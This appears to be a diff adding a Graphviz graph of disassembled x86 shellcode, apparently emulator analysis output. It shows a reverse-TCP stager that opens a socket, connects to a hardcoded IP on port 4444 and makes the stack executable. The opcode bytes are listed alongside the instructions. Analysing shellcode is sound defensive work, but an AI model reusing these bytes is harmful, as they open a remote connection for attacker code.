@@ -1,0 +1,13 @@
+digraph G {
+	//rankdir=LR
+	node [fontname=Courier, labeljust=r];
+	 "0x118a980" [shape=box, label = "0x00417000 6A0A                            push byte 0xa\l0x00417002 5E                              pop esi\l0x00417003 31DB                            xor ebx,ebx\l0x00417005 F7E3                            mul ebx\l0x00417007 53                              push ebx\l0x00417008 43                              inc ebx\l0x00417009 53                              push ebx\l0x0041700a 6A02                            push byte 0x2\l0x0041700c B066                            mov al,0x66\l0x0041700e 89E1                            mov ecx,esp\l"]
+	 "0x118d178" [shape=box, style=filled, color=".7 .3 1.0", label = "0x00417010 socket\l"]
+	 "0x118d250" [shape=box, label = "0x00417012 97                              xchg eax,edi\l0x00417013 5B                              pop ebx\l0x00417014 68C0A8C283                      push dword 0x83c2a8c0\l0x00417019 680200115C                      push dword 0x5c110002\l0x0041701e 89E1                            mov ecx,esp\l0x00417020 6A66                            push byte 0x66\l0x00417022 58                              pop eax\l0x00417023 50                              push eax\l0x00417024 51                              push ecx\l0x00417025 57                              push edi\l0x00417026 89E1                            mov ecx,esp\l0x00417028 43                              inc ebx\l"]
+	 "0x118de60" [shape=box, style=filled, color=".7 .3 1.0", label = "0x00417029 connect\l"]
+	 "0x118df40" [shape=box, label = "0x0041702b 85C0                            test eax,eax\l0x0041702d 7919                            jns 0x1b\l0x00417048 B207                            mov dl,0x7\l0x0041704a B900100000                      mov ecx,0x1000\l0x0041704f 89E3                            mov ebx,esp\l0x00417051 C1EB0C                          shr ebx,0xc\l0x00417054 C1E30C                          shl ebx,0xc\l0x00417057 B07D                            mov al,0x7d\l"]
+	 "0x118a980" -> "0x118d178" [style = bold ]
+	 "0x118d178" -> "0x118d250" [style = bold ]
+	 "0x118d250" -> "0x118de60" [style = bold ]
+	 "0x118de60" -> "0x118df40" [style = bold ]
+}
